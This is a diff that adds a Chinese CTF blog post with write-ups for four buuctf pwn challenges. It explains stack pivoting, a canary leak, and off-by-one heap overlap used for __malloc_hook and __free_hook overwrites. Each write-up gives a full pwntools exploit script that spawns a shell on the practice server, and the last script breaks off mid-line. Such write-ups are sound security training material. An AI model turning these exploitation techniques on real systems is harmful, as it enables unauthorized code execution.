@@ -150,6 +150,134 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/buuctf-pwn-write-ups-8/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (8)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:11:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:11:00+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:31:07" itemprop="dateModified" datetime="2023-03-01T11:31:07+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>8.7k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>8 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu062-gyctf_2020_borrowstack"><a class="markdownIt-Anchor" href="#buu062-gyctf_2020_borrowstack"></a> buu062-gyctf_2020_borrowstack</h1>
+<p>栈迁移。常规的栈迁移方法是返回到leave指令，之前修改rbp到合适的值。我们将rbp修改到bss段的内部，将栈迁移到这里。需要注意不能将栈迁移到变量bank的开头，因为后面还需要调用puts等函数，往上可能会覆盖某些重要数据。因此迁移的地址应该尽量靠后（下面脚本中迁移的地址是bank+0xA0）。使用puts函数读取got表，获取到libc版本，然后使用one_gadget即可getshell。（经过尝试，本题使用system(“/bin/sh”)不可行，原因不明）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29767</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addrsp_8_ret = <span class="number">0x4004c5</span></span><br><span class="line">pop3_ret = <span class="number">0x4006ff</span></span><br><span class="line">poprdi_ret = <span class="number">0x400703</span></span><br><span class="line">poprsi_r15_ret = <span class="number">0x400701</span></span><br><span class="line">gadget = <span class="number">0x4006FA</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> - <span class="number">8</span> + <span class="number">0xA0</span>)    <span class="comment"># new ebp</span></span><br><span class="line">payload += p64(<span class="number">0x400699</span>)    <span class="comment"># leave</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Tell me what you want\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xA0</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprsi_r15_ret)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> + <span class="number">0x48</span> + <span class="number">0xA0</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># 仅设定了read函数的前两个参数，第三个参数size没有设置，但是是一个很大的值</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;stack now!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">payload = p64(base + one_gadgets[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu063-others_babystack"><a class="markdownIt-Anchor" href="#buu063-others_babystack"></a> buu063-others_babystack</h1>
+<p>简单的canary泄露栈溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29017</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Output</span>():</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">Input(cyclic(<span class="number">0x89</span>))</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x88</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">canary &amp;= <span class="number">0xFFFFFFFFFFFFFF00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">Input(payload)</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">retaddr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line">libc_start_main = retaddr - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">0x400A93</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">Input(payload)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu064-0ctf_2017_babyheap"><a class="markdownIt-Anchor" href="#buu064-0ctf_2017_babyheap"></a> buu064-0ctf_2017_babyheap</h1>
+<p>同第29题。</p>
+<h1 id="buu065-hitcontraining_heapcreator"><a class="markdownIt-Anchor" href="#buu065-hitcontraining_heapcreator"></a> buu065-hitcontraining_heapcreator</h1>
+<p><img src="1.png" alt="" /><br />
+容易得到程序控制的结构体如上，一共可以申请至多10个这样的结构体。包含创建、删除、打印、修改选项，其中修改选项中含有off by one漏洞。<br />
+<img src="2.png" alt="" /><br />
+这里read_input函数中使用的是read函数，因此这一个溢出的字节可以是任何值。将这个字节的值变大会导致堆块重叠。<br />
+<img src="3.png" alt="" /></p>
+<p>这里插一条笔记：</p>
+<blockquote>
+<p>如果使用free函数释放紧邻top chunk下面的大于最大fastbin容纳范围的chunk，当这个chunk的大小加上top chunk的大小大于FASTBIN_CONSOLIDATION_THRESHOLD（65536）时会触发malloc_consolidate()函数将所有的fastbin清空并归位到unsorted bins中。详情请见<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">源码</a>第4054~4076行。调试中无意发现，在此记录，与本题关系不大。</p>
+</blockquote>
+<p>经过调试验证，证实上面的思路是正确的。我们成功通过off by one漏洞获取到一个chunk_info的读写权限。<br />
+<img src="4.png" alt="" /><br />
+<img src="5.png" alt="" /><br />
+那么，后面的思路也就清晰了：将后面一个chunk_info的可读写空间调大，获取到#4中的main_arena地址，进而计算libc基地址。然后直接将#3的可写地址改为__free_hook地址，写入one_gadget，再调用free函数即可getshell。<br />
+<img src="6.png" alt="" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27833</span>)</span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[0]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[2]</span></span><br><span class="line">edit(<span class="number">0</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">edit(<span class="number">1</span>, cyclic(<span class="number">0x40</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x100</span>))  <span class="comment"># change the readable size of heaparray[2]</span></span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[3]</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4]</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aabcaab&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">88</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的这个payload是用来还原部分堆环境的</span></span><br><span class="line"><span class="comment"># 因为前面读取使用printf函数，在main_arena地址之前不能有空字节，所以会覆盖掉两个chunk的控制信息</span></span><br><span class="line"><span class="comment"># 这里将其还原，保证后面创建chunk的时候能够正常</span></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4], reallocate</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(__free_hook)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">edit(<span class="number">3</span>, p64(base + one_gadgets[<span class="number">1</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu066-roarctf_2019_easy_pwn"><a class="markdownIt-Anchor" href="#buu066-roarctf_2019_easy_pwn"></a> buu066-roarctf_2019_easy_pwn</h1>
+<p>也是一道考察off by one漏洞的题目。<br />
+经过分析，本题使用的数据结构如下：一共可以创建至多16个这样的结构。<br />
+<img src="7.png" alt="" /><br />
+在write_note实现函数中，当输入的size值是原来定义值-10时会触发一个off by one漏洞，能够溢出一个字节。<br />
+<img src="8.png" alt="" /><br />
+可见本题的思路和上一题类似，但由于本题的堆环境不同，需要对利用姿势加以修改。<br />
+<img src="9.png" alt="" /></p>
+<p>如上图所示，我们通过off by one漏洞将下一个chunk的size改大，使其能够正好覆盖下一个chunk。由于可读写的空间大小保存在bss段，因此此时我们可读写的空间大小实际上并没有改变。然后将这个改大的chunk释放，这样就会产生一个和下一个chunk完全重合的free chunk，在内部保存有main_arena的地址。通过读取下一个chunk即可获取。<br />
+<img src="10.png" alt="" /><br />
+获取到__malloc_hook的地址之后，我们可以通过上图的方式进行fastbin attack。同样是堆块重叠，但这次是将整个unsorted bin chunk都重新申请回来，通过中间的chunk #4修改chunk #5的fd指针到__malloc_hook，这样可以在接下来申请到__malloc_hook处的chunk。</p>
+<p>然后，我们可以在__malloc_hook中写入one_gadget的地址。但经过测试发现，能够使用的4个one_gadget都不能让我们获得shell。通过one_gadget打印出来的地址可以知道，这些one_gadget想要执行是有一定条件的，如栈上某个地址需要为0，rax为0等等。如果直接将one_gadget写入__malloc_hook不行，可以考虑将one_gadget写到__realloc_hook中，在__malloc_hook中写realloc函数中的地址，注意我们想要修改栈的环境，需要写realloc+4的地址，这样可以避免执行push rbp; mov rbp, rsp这两条指令，从而产生8字节的错位。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 25959)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4b6, 0x3f50a, 0xd5a27]</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]</span></span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4a6, 0x3f4fa, 0xd5b87]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_note</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #0</span></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #2</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #3</span></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #4</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #6</span></span><br><span class="line">write_note(<span class="number">0</span>, <span class="number">0x48</span>+<span class="number">10</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\xE1&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">1</span>)</span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">show_note(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&#x27;realloc&#x27;</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #7, same addr as #2</span></span><br><span class="line">write_note(<span class="number">3</span>, <span class="number">0x18</span>+<span class="number">10</span>, cyclic(<span class="number">0x18</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">4</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #4, overlap #5</span></span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">drop_note(<span class="number">5</span>)</span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + 